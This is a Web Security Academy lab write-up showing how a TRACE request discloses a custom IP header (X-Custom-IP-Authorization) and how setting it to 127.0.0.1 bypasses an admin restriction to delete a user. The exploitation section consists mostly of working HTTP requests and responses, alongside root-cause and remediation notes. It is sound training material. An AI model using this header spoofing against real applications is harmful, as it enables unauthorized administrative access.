# PortSwigger Lab: Authentication bypass via information disclosure

# TAGS: Information Disclosure, Authentication Bypass, HTTP Headers, Burp Suite

Category: Information Disclosure
Date: October 29, 2026
Day: Thursday
Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
Published: Ready
Status: Done

---

## Intro

This is the fourth lab in the **Information Disclosure** series. The admin panel is restricted to requests coming from **localhost**, and the front-end decides the client IP from a custom header: `X-Custom-IP-Authorization`. A `TRACE` request reflects the headers and discloses that value — and because the back-end trusts the header, setting it to `127.0.0.1` bypasses the restriction entirely.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the administration interface has an authentication bypass, but it is impractical to exploit without knowing a custom HTTP header used by the front-end. The goal is to obtain the header name, use it to bypass authentication, access the admin interface and delete `carlos`. The credentials are **wiener:peter**.

I requested the admin panel:

```http
GET /admin HTTP/2
Host: 0adc001e04e32cfb827a61e700a90003.web-security-academy.net
```

The response explains the restriction:

> Admin interface only available if logged in as an administrator, or if requested from a local IP.

So the check is IP-based — and IP-based checks are only as strong as the source of the IP.

---

## Exploitation:

#### Step 1: Use TRACE to reveal the custom header

I sent the request again with the `TRACE` method:

```http
TRACE /admin HTTP/2
Host: 0adc001e04e32cfb827a61e700a90003.web-security-academy.net
```

```http
HTTP/2 200 OK

TRACE /admin HTTP/1.1
Host: 0adc001e04e32cfb827a61e700a90003.web-security-academy.net
user-agent: curl/8.18.0
accept: */*
Content-Length: 0
X-Custom-IP-Authorization: 167.58.161.25
```

`TRACE` echoes the request back, and the front-end had appended my IP in the **`X-Custom-IP-Authorization`** header. That is the header the back-end uses to decide whether the request came from localhost.

#### Step 2: Spoof localhost

I sent the admin request with the header set to `127.0.0.1`:

```http
GET /admin HTTP/2
Host: 0adc001e04e32cfb827a61e700a90003.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

Users
wiener - Delete
carlos - Delete
```

The back-end accepted the request as if it came from localhost.

#### Step 3: Delete carlos

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0adc001e04e32cfb827a61e700a90003.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```

The lab showed **"Congratulations, you solved the lab!"**.

In Burp, the same result can be automated with **Proxy → Match and replace**: add a request-header rule with an empty Match and `X-Custom-IP-Authorization: 127.0.0.1` as the Replace value.

---

## Root Cause

Two issues combine:

1. **The back-end trusts a client-controllable header** (`X-Custom-IP-Authorization`) to determine the client's IP for an authorization decision.
2. **`TRACE` is enabled**, so the application reflects request headers and discloses the header the front-end uses.

Once the header name is known, spoofing it is trivial — and the "localhost only" restriction disappears.

---

## Impact

An attacker can bypass the IP-based access control and reach the **admin interface from anywhere**, then delete or modify users. In a real application, trusting a header for authorization is a complete authentication/authorization bypass, often leading to full administrative compromise.

---

## Remediation

To prevent this issue, applications should:

- **Never use client-supplied headers for authorization.** Derive the client IP from the network layer, and enforce admin access on the session/role, not the IP;
- **Strip or overwrite** `X-Custom-IP-Authorization` (and similar headers) at the edge/proxy before forwarding requests;
- **Disable the `TRACE` method** in production;
- Protect admin endpoints with strong authentication and network controls (VPN, mTLS) when localhost-only access is required.

---

## Key Takeaways

1. `TRACE` reflects request headers — a quick way to discover internal ones.
2. Never trust a header to make an authorization decision.
3. IP-based restrictions are bypassable when the IP comes from a header.
4. Setting the custom header to `127.0.0.1` turned a blocked request into full admin access.

---

## References

- [PortSwigger — Information disclosure](https://portswigger.net/web-security/information-disclosure)
- [PortSwigger — Authentication bypass via information disclosure (lab)](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)
- [OWASP — Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
